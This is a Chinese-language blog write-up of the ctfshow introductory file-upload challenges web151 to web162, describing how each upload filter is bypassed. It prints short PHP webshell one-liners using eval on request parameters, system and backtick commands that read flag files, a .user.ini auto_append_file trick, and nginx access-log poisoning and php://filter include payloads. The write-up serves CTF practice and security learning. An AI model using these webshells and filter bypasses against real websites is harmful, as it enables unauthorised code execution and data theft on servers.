---
title: "ctfshow Web入门[文件上传] Writeup"
date: 2022-07-29T14:29:48+08:00
draft: false
tags: []
categories: []
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

<!--more-->

## web151

"前台校验不可靠"

前端 js 验证, 同时对图片内容进行了验证

![20220729144234](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220729144234.png)

上传抓包改后缀

![20220729144318](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220729144318.png)

## web152

之前的图片马抓包改后缀上传直接就成功了

看了 wp 才发现是在验证 MIME Type (Content-Type)

## web153

一开始试了好几个后缀都不成功 (应该是黑名单验证)

网上查了一下考察的是 `.user.ini` (因为服务器是 nginx 的, 如果是 apache 就可以利用 .htaccess)

[https://www.cnblogs.com/NineOne/p/14033391.html](https://www.cnblogs.com/NineOne/p/14033391.html)

我的理解是用户层面的 `php.ini` (类似于 dll 查找优先级), 一部分配置 (除了 PHP_INI_SYSTEM 以外) 可以优先于 `php.ini` 生效

其中的两个配置 `auto_append_file` `auto_prepend_file` 能用来制造后门

`auto_append_file` 在该目录下的所有文件头部包含某个文件的内容, `auto_prepend_file` 则是在文件尾部包含某个文件的内容

注意这个是不能跨目录的, `.user.ini` 的作用范围被限制在了上传后所在的文件夹, 但这里**碰巧**的是 /upload/ 目录下存在一个 index.php

![20220729151238](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220729151238.png)

根据黑名单机制, 我们先上传图片马, 然后上传 `.user.ini`, 内容如下

```
auto_append_file = "2.png"
```

注意修改 Content-Type, 而且文件名要加引号

访问 index.php

![20220729151810](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220729151810.png)

## web154

图片不能正常上传

测试了一下发现是检测了文件内容中的 `php` 字符串

将 php 改成 `=` 即可绕过 (或者 `php` 修改为大写)

```
<?= eval($_REQUEST['a']); ?>

<?phP eval($_REQUEST['a']); ?>
```

 之后配合 `.user.ini`

 或者是利用 PHP 短标签, 将一句话改为 `<? eval($_REQUEST['a']);?>`

 `.user.ini` 改为如下内容

 ```
auto_append_file = "2.png"
short_open_tag = On
 ```

 上传即可

 使用 `<script>` 标签也可以, 未测试

 ## web155

 过滤了 `PHP`, 忽略大小写

 利用 `<?=` `<?` 短标签依然可以绕过

 ## web156

自己的图片马有点问题, 把代码删掉还是传不了

看了师傅的 wp 发现是过滤了 `[]`

用 `{}` 绕过

```
<?= eval($_REQUEST{'a'}); ?>

<?= eval($_REQUEST{1}); ?>
```

## web157

`[]` `{}`, `;` 都被过滤了

考虑到机器是 Linux, 使用 `system()` 执行文件查看 flag.php

`php` 被过滤了, 但是可以用通配符 `*`

```
Gif89a
<?= system('cat ../flag.*')?>
```

之后访问 /upload/index.php 右键查看 flag

## web158

同上

## web159

又过滤了 `()`

用反引号绕过

```
<?= `cat ../flag.*`?>
```

## web160

反引号和空格也被过滤了, 没想出来

网上 wp 的思路是通过文件包含

nginx 默认日志地址为 `/var/log/nginx/access.log`

默认格式

```
log_format access '$remote_addr – $remote_user [$time_local] "$request"' '$status $body_bytes_sent "$http_referer"' '"$http_user_agent" $http_x_forwarded_for';
```

include

注意 log 被过滤了, 需要拼接字符串
```
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

更改 User-Agent 为 PHP 一句话, 再访问一次网站即可

也可以用伪协议, 字符串拼接绕过过滤

```
<?=include"ph"."p://filter/convert.base64-encode/resource=../flag.ph"."p"?>
```

## web161

增加了对文件头的验证

![20220729191141](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220729191141.png)

![20220729191507](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220729191507.png)

Content-Type, filename 文件头都是 gif 格式的竟然上传不了

把前两个改成 png 就能上传了

使用 GIF89a 的原因是他是 jpg png gif bmp 中唯一一个可以以字符串表示的文件头

获取 flag 方法同上

后来查了一下发现是利用 `getimagesize()` 验证文件头的

## web162

`.` `flag` 被过滤了

看了 wp 才知道考察的是 session 文件包含 + 条件竞争